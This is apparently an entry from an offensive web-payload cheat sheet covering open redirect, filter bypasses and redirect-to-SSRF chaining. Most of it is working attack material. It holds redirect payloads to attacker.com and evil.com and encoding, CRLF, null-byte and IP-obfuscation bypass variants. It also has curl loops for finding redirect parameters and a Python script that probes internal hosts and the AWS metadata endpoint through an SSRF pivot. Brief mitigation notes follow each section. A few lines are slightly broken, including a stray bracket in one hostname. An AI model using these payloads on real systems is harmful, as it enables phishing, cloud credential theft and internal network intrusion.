# Open Redirect

_3 web payloads_

### Basic Open Redirect  `redirect-basic`
_URL redirect vulnerability exploitation_
Subcategory: **Basic** · tags: `redirect` `url` `phishing`

**Prerequisites:**
- A target parameter controls the redirect address

**Attack chain:**

**Direct redirect**
> Redirect directly to the attacker's site
```
http://target.com/redirect?url=http://attacker.com
```
**Syntax breakdown:**
- `url=http://attacker.com` — Specifies the redirect target _parameter_

**Bypass validation**
> @ symbol bypass
```
http://target.com/redirect?url=http://attacker.com@target.com
```
**Syntax breakdown:**
- `attacker.com@target.com` — Bypass by exploiting URL parsing differences _value_

**Slash bypass**
> // bypasses the protocol
```
http://target.com/redirect?url=//attacker.com
```
**Syntax breakdown:**
- `//attacker.com` — Protocol-relative URL _value_

**WAF/EDR bypass variants:**

**URL encoding and double encoding bypass**
> Bypass allowlist/blocklist checks on the redirect target address using URL encoding, double URL encoding, Unicode homoglyphs, CRLF injection, and similar techniques
```
# URL encoding:
/redirect?url=%68%74%74%70%3a%2f%2fattacker.com
# Double encoding:
/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com
# Unicode encoding:
/redirect?url=http://attacker。com
/redirect?url=http://ⓐttacker.com
# CRLF injection:
/redirect?url=%0d%0aLocation:%20http://attacker.com
```
**Syntax breakdown:**
- `# URL encoding:` — Primary command _command_
- `...` — 9 lines total _value_

**Backslash and data: URI bypass**
> Bypass domain allowlist validation using divergent backslash handling across parsers, the data: URI scheme, multi-slash protocol-relative URLs, and similar techniques
```
# Backslash tricks:
/redirect?url=http://attacker.com@target.com
/redirect?url=//attacker.com
/redirect?url=/attacker.com

# data: URI:
/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# Protocol-relative URL variants:
/redirect?url=//attacker.com
/redirect?url=///attacker.com
/redirect?url=////attacker.com
```
**Syntax breakdown:**
- `# Backslash tricks:` — Primary command _command_
- `...` — 10 lines total _value_

**Overview:** An open redirect vulnerability lets an attacker tamper with a URL parameter to redirect the user from a trusted domain to any external malicious site. It is often used in phishing attacks (leveraging the credibility of the trusted domain), OAuth token theft, SSRF protection bypass, and similar scenarios, and is an important aid to social engineering attacks.

**Vulnerability principle:** When handling a redirect URL parameter (such as redirect_url, return_to, next, etc.), the application does not perform strict allowlist validation of the target URL and only does a simple domain-containment check (such as checking whether the string contains trusted.com). This can be bypassed by an attacker via URL encoding, adding a subdomain (trusted.com.evil.com), using the @ symbol (trusted.com@evil.com), and similar techniques.

**Exploitation method:** First identify all redirect parameters in the application (via crawling, JS analysis, login/logout flows), then test changing the redirect target to an external domain. If blocked, try bypass techniques: double URL encoding, protocol-relative URLs (//evil.com), the @ symbol (https://trusted.com@evil.com), adding the trusted domain as a subdomain (https://evil.com/trusted.com), backslashes (https://trusted.com\\@evil.com), etc.

**Mitigation:** Enforce strict allowlist validation, only allowing redirects to a predefined list of trusted domains; use relative paths instead of full URLs for on-site redirects; sign redirect URL parameters to prevent tampering; show an intermediate confirmation page to the user before redirecting; configure the Content Security Policy (CSP) navigate-to directive to restrict navigable domains.

---

### Redirect Bypass  `redirect-bypass`
_Open redirect bypass techniques_
Subcategory: **Bypass** · tags: `redirect` `bypass`

**Prerequisites:**
- A redirect parameter exists

**Attack chain:**

**URL encoding**
> Use URL encoding
```
redirect=http%3a%2f%2fattacker.com
```
**Syntax breakdown:**
- `%3a` — Colon : _char_

**@ symbol**
> Exploit the URL authentication portion
```
redirect=http://target.com@attacker.com
```
**Syntax breakdown:**
- `@` — Separates the userinfo from the host _char_

**Backslash**
> Use a backslash
_platform: windows_
```
redirect=https:/\attacker.com
```
**Syntax breakdown:**
- `redirect=https:/\attacker.com` — Command/keyword _command_

**WAF/EDR bypass variants:**

**Backslash path normalization**
> Exploit path-normalization differences of backslashes across browsers/servers to bypass the redirect domain allowlist
```
# Backslash instead of forward slash
https://target.com/redirect?url=https://evil.com\@target.com
https://target.com/redirect?url=https:\\evil.com

# Path traversal to bypass the domain allowlist
https://target.com/redirect?url=https://target.com/..%2f@evil.com
https://target.com/redirect?url=//evil.com/%2f..%2f

# Protocol-relative URL
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\\evil.com
```
**Syntax breakdown:**
- `# Backslash instead of forward slash` — Primary command _command_
- `...` — 9 lines total _value_

**URL fragment and parameter injection**
> Bypass the server-side redirect target check using URL fragment identifiers, parameter pollution, and full URL encoding
```
# Fragment identifier obfuscation
https://target.com/redirect?url=https://target.com#@evil.com
https://target.com/redirect?url=https://target.com%23@evil.com

# Parameter pollution
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26next=evil.com

# Encoding obfuscation
https://target.com/redirect?url=https%3a%2f%2fevil.com
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```
**Syntax breakdown:**
- `# Fragment identifier obfuscation` — Primary command _command_
- `...` — 9 lines total _value_

**Null byte and special character truncation**
> Use null-byte truncation of URL validation, CRLF injection of extra headers, and special whitespace characters to confuse URL parsing
```
# Null byte truncation
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# Newline injection
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/space obfuscation
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)
```
**Syntax breakdown:**
- `# Null byte truncation
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# Newline injection
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/space obfuscation
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)` — Injection code _value_

**Overview:** Developers often restrict redirects with regexes or blocklists, which can be bypassed by a variety of techniques.

**Vulnerability principle:** The validation logic is not strict.

**Exploitation method:** Use encoding, special characters, and IP formats to bypass.

**Mitigation:** Allowlist-validate the domain.

---

### Redirect to SSRF  `redirect-ssrf`
_Use an open redirect vulnerability as a pivot to steer SSRF probing into the internal network, bypassing the URL allowlist/blocklist restrictions of SSRF_
Subcategory: **SSRF** · tags: `redirect` `ssrf`

**Prerequisites:**
- The target has an open redirect vulnerability
- The target has an SSRF entry point (URL parameter/Webhook, etc.)
- The SSRF filter only checks the initial URL and does not follow redirects

**Attack chain:**

**Identify open redirect points**
> Find open redirect endpoints and parameters on the target site
_platform: linux_
```
# Common redirect parameters:
curl -sI "http://target.com/redirect?url=https://evil.com" | grep -i location
curl -sI "http://target.com/login?next=https://evil.com" | grep -i location
curl -sI "http://target.com/goto?link=https://evil.com" | grep -i location

# Batch-test common parameters:
for param in url redirect next goto link return returnUrl callback dest destination rurl; do
  status=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" -o /dev/null -w "%{http_code}")
  location=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" | grep -i "^location:" | head -1)
  echo "${param}: HTTP ${status} → ${location}"
done
```
**Syntax breakdown:**
- `grep -i location` — Check the Location response header of the redirect _command_
- `redirect,next,goto,link` — Common redirect parameter names _value_

**Bypass SSRF filtering via redirect**
> Use the target's own redirect endpoint to bypass the SSRF domain allowlist restriction
_platform: linux_
```
# Scenario: the SSRF interface checks the URL domain allowlist but does not check the redirect target

# Normal SSRF request (blocked):
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# → returns: "Blocked: internal IP"

# Bypass via redirect:
# 1. First confirm the redirect works:
curl -sI "http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# 2. Use the redirect URL as the SSRF input:
curl "http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
# → the SSRF filter sees target.com (in the allowlist) and lets it through
# → the server follows the redirect to 169.254.169.254
# → returns AWS metadata
```
**Syntax breakdown:**
- `169.254.169.254` — AWS metadata service address (a common SSRF target) _value_
- `http://target.com/redirect?url=` — Use the redirect on its own domain as an SSRF pivot _value_

**Short-link and DNS rebinding assistance**
> Use short links, self-hosted redirects, and DNS rebinding to assist SSRF bypass
```
# If the target site has no open redirect, use an external service:

# 1. Short-link service redirect:
# Create a short link pointing to an internal IP: bit.ly/xxxxx → http://192.168.1.1
curl "http://target.com/api/fetch?url=https://bit.ly/xxxxx"

# 2. Self-hosted redirect server:
# Python Flask:
# @app.route("/redirect")
# def redir():
#     return redirect("http://169.254.169.254/latest/meta-data/")
curl "http://target.com/api/fetch?url=http://attacker.com/redirect"

# 3. DNS rebinding:
# Use tools such as rbndr.us; the DNS record alternates between the attacker IP and the internal IP
# First resolution: attacker.com → 1.2.3.4 (passes the IP check)
# Second resolution: attacker.com → 169.254.169.254 (actual request)
curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"
```
**Syntax breakdown:**
- `bit.ly/xxxxx` — Short-link service automatically performs a 302 redirect _value_
- `rbndr.us` — DNS rebinding service that alternately resolves to different IPs _value_
- `DNS rebinding` — Switches the DNS resolution result between the IP validation and the actual request _value_

**Full exploitation chain: redirect → SSRF → internal network probing**
> Use the redirect → SSRF chain to batch-probe internal network resources
```
# Full attack chain:
import requests

TARGET = "http://target.com"
SSRF_URL = f"{TARGET}/api/fetch?url="
REDIR_URL = f"{TARGET}/redirect?url="

# Probe the internal network via redirect:
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

for internal in internal_targets:
    # Construct: SSRF → redirect → internal target
    payload = f"{SSRF_URL}{REDIR_URL}{internal}"
    try:
        r = requests.get(payload, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] FOUND: {internal}")
            print(f"    Response: {r.text[:200]}")
        else:
            print(f"[-] {internal}: HTTP {r.status_code}")
    except Exception as e:
        print(f"[!] {internal}: {e}")
```
**Syntax breakdown:**
- `SSRF_URL + REDIR_URL + internal` — Three-layer chained exploitation: SSRF interface → redirect → internal network _value_
- `timeout=5` — Set a timeout to avoid long waits when the internal host is unreachable _parameter_

**WAF/EDR bypass variants:**

**Exploiting URL parsing differences**
> Exploit differences in how various URL parsing libraries (cURL/urllib/Java URL) parse the authority/host portion to bypass the SSRF allowlist
```
# Exploit URL parsing library differences
http://evil.com#@target.com
http://evil.com\@target.com
http://target.com@evil.com

# Special URL formats
http://evil。com (full-width period)
http://ⓔⓥⓘⓛ.com (Unicode circled characters)
http://evil%E3%80%82com

# IPv6 address obfuscation
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```
**Syntax breakdown:**
- `# Exploit URL parsing library differences` — Primary command _command_
- `...` — 11 lines total _value_

**DNS rebinding attack**
> Switch the resolution result between URL validation and the actual request via DNS rebinding to bypass the SSRF IP blocklist
```
# DNS Rebinding attack steps
# 1. Configure the DNS server to alternately return different IPs
# evil.com -> 1st resolution: public IP (passes validation)
# evil.com -> 2nd resolution: 127.0.0.1 (actual request)

# Use rbndr.us for automatic DNS rebinding
http://7f000001.c0a80001.rbndr.us/internal

# Use 1u.ms
http://make-127.0.0.1-rr.1u.ms/admin

# TOCTOU: the domain resolves to an allowlisted IP at check time and to an internal IP at request time
```
**Syntax breakdown:**
- `# DNS Rebinding attack steps` — Primary command _command_
- `...` — 9 lines total _value_

**Obfuscated IP address representation**
> Represent internal IPs in decimal, octal, hexadecimal, and IPv6-mapped forms to bypass the blocklist check
```
# Decimal IP
http://2130706433  (= 127.0.0.1)
http://3232235777  (= 192.168.1.1)

# Octal IP
http://0177.0.0.1  (= 127.0.0.1)
http://0x7f.0.0.1  (= 127.0.0.1)

# Mixed radix
http://0177.0x0.0.1
http://127.1  (omitted zero segments)
http://127.0.1

# IPv6 mapping
http://[::1]
http://[::]  (= 0.0.0.0)
http://[::ffff:7f00:1]
```
**Syntax breakdown:**
- `# Decimal IP` — Primary command _command_
- `...` — 14 lines total _value_

**Overview:** The redirect + SSRF combination attack is an advanced SSRF bypass technique. When the SSRF filter only checks the domain/IP of the initial URL (allowlist) but the server-side HTTP client follows 302 redirects, an attacker can use the target's own open redirect endpoint as a pivot to redirect the request from an allowlisted domain to an internal IP address.

**Vulnerability principle:** 1) The target has an open redirect vulnerability (the redirect target is not validated) 2) The URL filter of the SSRF feature only checks the domain/IP of the initial request 3) The server-side HTTP client automatically follows 302/301 redirects 4) The request after the redirect no longer passes through the URL filter

**Exploitation method:** Exploitation flow: 1) Find an open redirect endpoint 2) Confirm an SSRF entry point 3) Construct a redirect URL pointing to an internal target 4) Use the redirect URL as the SSRF input 5) Access the internal network by bypassing the allowlist via the redirect

**Mitigation:** 1) Fix all open redirect vulnerabilities 2) SSRF filtering should be applied at every hop of the HTTP request 3) Disable automatic redirect following in the HTTP client 4) Dual allowlist + blocklist filtering 5) Network-layer isolation of the server hosting the SSRF feature

---
